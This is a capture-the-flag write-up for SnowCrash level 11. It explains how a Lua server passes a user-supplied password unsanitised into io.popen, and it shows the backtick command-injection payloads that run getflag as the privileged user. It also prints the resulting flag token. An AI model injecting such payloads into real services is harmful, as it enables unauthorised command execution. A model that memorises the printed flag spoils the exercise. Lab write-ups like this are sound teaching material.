## Level 11

We found a single file [level11.lua](./level11.lua) containing a server accepting connections and asking for a password which will be hashed.

Issue being that it only return `Erf nope..` if we didn't input the right pass, or `Gw you dumb*` if we get the good one.

Hinting us at the fact that the hashed pass isn't what we look for.

### Exploit

```lua
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

We have control over `pass` since it's what we send to the server after the connection is made with the server.

It uses an `echo` which means that we somehow have control over something, second issue being that it returns the output of popen in a stream `prog`.

Obviously even the `print` later in the script isn't useful since it's supposed to print server side and not client side.

Now the intersting part:

We can use a wonderfull shell command named [wall](https://linuxize.com/post/wall-command-in-linux/) which will broadcast the output of the previous command to every logged user. Which is amazing since the user connected via `nc` is considered in this list.

As we saw in this test:

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `echo lol | wall`
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 15:27 ...                                               
                                                                               
lol                                                                            
                                                                               
Erf nope..
```

When trying to echo the "lol" and piping it to `wall`. The execution of the script get broadcasted to every user connected to the machine. Moreover, the message is broadcasted as `flag11@snow` which means that it's executed as sudo (previously hinted by the `s` permissions when we used `ls -la`).

And so, here is the result:

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `echo \`getflag\` | wall`
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 15:27 ...                                               
                                                                               
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
                                                                               
Erf nope..
```

`getflag` gets executed as sudo and piped into `wall` which will broadcast the result to us and so we directly get the flag!

### Other solution

A simpler one we found later:

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag > /var/crash/pass`
Erf nope..
level11@SnowCrash:~$ cat /var/crash/pass 
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## Flag

fa6v5ateaw21peobuub8ipe6s
